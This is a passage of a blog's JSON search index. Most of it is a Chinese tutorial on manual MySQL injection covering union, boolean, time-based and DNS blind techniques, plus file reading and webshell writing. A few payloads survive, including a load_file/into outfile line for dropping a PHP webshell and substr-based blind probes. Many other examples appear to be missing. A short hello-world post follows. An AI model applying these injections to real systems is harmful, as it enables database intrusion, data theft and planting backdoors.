6.总结报告及修复方案"},{"title":"SQL手工注入入门教程","date":"2021-08-03T09:11:01.000Z","url":"/2021/08/03/%E6%B8%97%E9%80%8F%E7%AC%AC%E4%B8%80%E8%AF%BE/","tags":[["sql 注入","/tags/sql-%E6%B3%A8%E5%85%A5/"]],"categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"mysql基本hack函数：mid SELECT MID(ColumnName, Start [, Length]) FROM TableName LEFT(str,len) 返回字符串str的最左面len个字符 ASCII(str) =ORD 返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL SUBSTR(str,pos,len) 从str中多少个字符开始，截取多少位 CAST SELECT CAST(’12’ AS int) 将目标str转化为目标数据类型 IFNULL(expr1,expr2) 如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr2 updatexml() extracavalue() 判断字符的一些语句： LOAD_FILE加载本地文件（服务器上） 说明：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码 说明：“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69” select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’) into outfile‘c:\\wamp\\www\\test.php’ 可以将其他路径的文件导到web目录来供访问，一般用于把包含一句话木马的文件导出成php来链接 get与post请求注释符的区别一般很容易在各种教程上看到 ‘ or and 1=1 # 或 ‘ or and 1=1 –+ 但可能没人告诉你什么情况下该用什么。 #是sql语句中的注释符，+ 在http请求中表示空格，但get与post中，由于http请求的转义，请求到后端sql语句拼接的时候可能会不一样。 get请求的时候一般用: 1′ and 1=1 –+ //这里最后的空格用+，在请求的时候不会被urlencode，到后端sql语句中就会成为一个正常的空格，– 后面的语句就会被注释。 但是如果在post里最后用加号的话就会被urlencode成%2B，实际的空格被转义才被转义成+ post请求的时候一般用： 这时候，在post的情况下，最后一个空格，可以直接用空格，不用+来代替，因为post参数 空格会自动转成+； 而之所以不在get注入的时候使用“#”来注释，是因为，请求时，“#”不会被urlencode为“%23”，被识别为锚链接，无法传递至sql语句中。 找一个库中有哪些表名： 找一个表中有哪些列名： AND与OR的区别需要理解 and和or的区别 场景举例： 没有订单可以测的情况下，只能用or union联合查询注入当union前面的语句为false时才会执行后面语句（这里一定先学习union查询的用法） 如以下，union语句前 先构建一个错误条件。 union与order by 后面跟着的列数是跟前面的select 列数相同的，不是该表的总列数 总列数判断为： 解释：如果列数为2，则延时5秒响应。 判断某列是否存在也可以用： 当union查同库其他表时，需要知道库名： 如： 读文件/写shell这里包含了网上常见或不常见的导出一句话的骚操作 支持union的方法，最常规的方式： 16进制写shell 其中上面的16 进制组合成的是一个一句话，其实这样的sql可以过waf 利用分隔符写shell 如果不支持union，可以用分隔符导出一句话，当然字段数要大于2。 修改sql日志路径到web下的一个php文件 读文件： 基于布尔值的盲注可以通过响应的不同可以判断sql语句是否正确 枚举字符来判断字符是否存在 mysql的一些特征： 当试探第二个表的时候并不是改为limit1,1，因为limit针对的是条件筛选后的过滤，所以测试其他表的时候，继续修改正则即可，如果us[a-z]为1，ua[a-z]，说明至少有两个表，一个表以us开头，另一个ua开头 标准的正则布尔测试： 比如判断数据库版本： 判断是否条件成立的其他方法： 盲注流程获取库名： and%20ord(substr(database(),1,1))&gt;80+–+ 获取表名： 利用 substr() ascii()函数进行尝试 获取字段名： 获取表数据： 通过dns获取盲注数据： 由于union后必须跟上与前面同样的字段数，所以需要把load_file放在其中，非union直接select load_file即可 dns获取盲注数据示例： \\foobar 后面要有一串任意字符，访问远程目录的意思，所以这个“foobar”可以用任意字符替换。 还可以： 延时注入适用于当我们测试的时候没有任何回显来判断是否有注入，比如订单搜索，比如当sql错误的时候返回与正确的相同，我们就无法通过回显差异来判断注入 如下图代码，成立与否页面不变化 延时注入 适用于当我们测试的时候没有任何回显来判断是否有注入，比如订单搜索，比如当sql错误的时候返回与正确的相同，我们就无法通过回显差异来判断注入 如下图代码，成立与否页面不变化 所以就需要通过判断是否延时来确认是否有注入 如果过滤逗号，可以： 还可以利用 union select 加 order by 逐字猜解… 假设，name 是 admin 当 猜出第一个字母为 ‘a’ 时，’a’=’a’及真。用 0，1表示的话就是1，然后 sleep(15)，如果是假，那就是sleep(05)… 先基本判断有没有延时，然后在load_file来dns查询 可以 post注入最大的区别在于注释符的使用，and改为or而已 如： 参考文章："},{"title":"hello-world","date":"2021-05-02T09:30:00.000Z","url":"/2021/05/02/my-first-blog/","categories":[["日常","/categories/%E6%97%A5%E5%B8%B8/"]],"content":"Hello, World是指在电脑屏幕显示“Hello, World!”（你好，世界！）字符串的计算机程序。相关的程序通常都是每种电脑编程语言最基本、最简单的程序，也会用作示范一个编程语言如何运作。同时它亦可以用来确认一个编程语言的编译器、程序开发环境及运行环境是否已经安装妥当。因为写法简单可见，这也是很多初学者首次接触编程语言时会撰写的程序。 成功啦o(￣▽￣)ブ 有危险Σ(っ °Д °;)っ 有消息(・∀・(・∀・(・∀・*) 当心哦≧ ﹏ ≦ 折叠框的标题 被折叠的内容 1被折叠的内容 2… TYPE是面板框的类型，可以是： successsdangerinfowarning "}]